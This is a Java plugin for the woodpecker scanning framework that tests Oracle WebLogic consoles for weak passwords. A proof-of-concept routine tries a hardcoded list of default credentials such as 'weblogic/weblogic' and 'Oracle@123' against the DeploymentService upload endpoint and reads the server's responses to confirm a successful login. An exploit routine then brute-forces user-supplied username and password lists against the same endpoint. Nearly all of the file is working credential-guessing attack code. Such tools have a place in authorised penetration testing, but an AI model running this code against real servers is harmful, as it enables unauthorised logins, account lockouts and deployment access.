package vuldb.weakpass;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class WeakpassCheckPlugin implements IVulPlugin {
    public static IVulPluginCallbacks callbacks;
    public static IPluginHelper pluginHelper;
    public void VulPluginMain(IVulPluginCallbacks vulPluginCallbacks) {
        this.callbacks = vulPluginCallbacks;
        this.pluginHelper = callbacks.getPluginHelper();
        callbacks.setVulPluginName("Weblogic weak password check plugin");
        callbacks.setVulPluginVersion("0.1.0");
        callbacks.setVulPluginAuthor("woodpecker-org");
        callbacks.setVulCVSS(7.5);
        callbacks.setVulName("Weblogic console weak password");
        callbacks.setVulDescription("");
        callbacks.setVulCategory("weak password");
        callbacks.setVulAuthor("unkown");
        callbacks.setVulScope("all version");
        callbacks.setVulDisclosureTime("2017");
        callbacks.setVulProduct("weblogic");
        callbacks.setVulSeverity("high");
        callbacks.registerPoc(new WeakpassPoc());
        List<IExploit> exploitList = new ArrayList<IExploit>();
        exploitList.add(new WeakpassCrackExploit());
        callbacks.registerExploit(exploitList);
    }

    public class WeakpassPoc implements IPoc {
        String username = "weblogic";
        String[] password = new String[]{"weblogic","weblogic1","weblogic10","weblogic123","Oracle@123"};

        public IScanResult doVerify(ITarget target, IResultOutput resultOutput) throws Throwable {
            IScanResult scanResult = WeakpassCheckPlugin.pluginHelper.createScanResult();
            String vulURL = target.getRootAddress() + "bea_wls_deployment_internal/DeploymentService";

            Map<String,String> header = new HashMap<String, String>();
            header.put("wl_request_type","app_upload");
            header.put("wl_upload_application_name","/");
            header.put("archive","true");
            header.put("username",username);
            for(String pass:password){
                header.put("password",pass);
                try {
                    RawResponse rawResponse = Requests.post(vulURL).headers(header).timeout(10 * 10000).verify(false).send();
                    String strResp = rawResponse.readToText();
                    if (strResp != null && strResp.contains("[DeploymentService:290001]")) {
                        String msg = String.format("%s:%s 正确", username, pass);
                        resultOutput.successPrintln(msg);
                        scanResult.setExists(true);
                        scanResult.setMsg(msg);
                        break;
                    } else if(strResp.contains("[DeploymentService:290014]") && strResp.contains("Invalid user name or password")){
                        String msg = String.format("%s:%s 不正确", username, pass);
                        resultOutput.failPrintln(msg);
                        scanResult.setExists(false);
                    } else {
                        resultOutput.failPrintln(String.format("%s:%s 可能不正确", username, pass));
                    }
                    resultOutput.debugPrintln(strResp);
                }catch (Exception e){
                    resultOutput.errorPrintln(WeakpassCheckPlugin.pluginHelper.getThrowableInfo(e));
                }

            }

            if(!scanResult.isExists()){
                resultOutput.infoPrintln("已经爆破5次，账号被锁定30分钟");
                scanResult.setMsg("未发现弱口令");
            }

            return scanResult;
        }
    }

    public class WeakpassCrackExploit implements IExploit {
        public String getExploitTabCaption() {
            return "crack weak password";
        }

        public IArgsUsageBinder getExploitCustomArgs() {
            IArgsUsageBinder argsUsageBinder = WeakpassCheckPlugin.pluginHelper.createArgsUsageBinder();
            List<IArg> argsList = new ArrayList<IArg>();
            IArg usernameArg = WeakpassCheckPlugin.pluginHelper.createArg();
            usernameArg.setName("username");
            usernameArg.setRequired(true);
            usernameArg.setDefaultValue("weblogic,system");
            usernameArg.setDescription("密码字典");
            argsList.add(usernameArg);

            IArg passwrodArg = WeakpassCheckPlugin.pluginHelper.createArg();
            passwrodArg.setName("password");
            passwrodArg.setRequired(true);
            passwrodArg.setDefaultValue("weblogic,system");
            passwrodArg.setDescription("密码字典");
            argsList.add(passwrodArg);

            argsUsageBinder.setArgsList(argsList);
            return argsUsageBinder;
        }

        public void doExploit(ITarget target, Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
            String vulURL = target.getRootAddress() + "bea_wls_deployment_internal/DeploymentService";
            String username = (String)customArgs.get("username");
            String[] users = username.split(",");
            String password = (String)customArgs.get("password");
            String[] passs = password.split(",");

            Map<String,String> header = new HashMap<String, String>();
            header.put("wl_request_type","app_upload");
            header.put("wl_upload_application_name","/");
            header.put("archive","true");
            boolean isSuccess = false;
            int count = 0;
            for(String user:users){
                header.put("username",user);
                for (String pass:passs){
                    header.put("password",pass);
                    try {
                        RawResponse rawResponse = Requests.post(vulURL).headers(header).timeout(10 * 10000).verify(false).send();
                        String strResp = rawResponse.readToText();
                        if (strResp != null && strResp.contains("[DeploymentService:290001]")) {
                            String msg = String.format("%s:%s 正确", user, pass);
                            resultOutput.successPrintln(msg);
                            isSuccess = true;
                            break;
                        }else if(strResp.contains("[DeploymentService:290014]") && strResp.contains("Invalid user name or password")){
                            String msg = String.format("%s:%s 不正确", user, pass);
                            resultOutput.failPrintln(msg);
                        }else{
                            resultOutput.failPrintln(String.format("%s:%s 可能不正确", user, pass));
                        }
                        resultOutput.debugPrintln(strResp);
                    }catch (Exception e){
                        resultOutput.errorPrintln(WeakpassCheckPlugin.pluginHelper.getThrowableInfo(e));
                    }
                    count++;
                    if(count == 5){
                        resultOutput.infoPrintln("已经爆破5次，账号被锁定30分钟,后续爆破将无效");
                    }
                }
                if(isSuccess)break;
            }
        }
    }
}
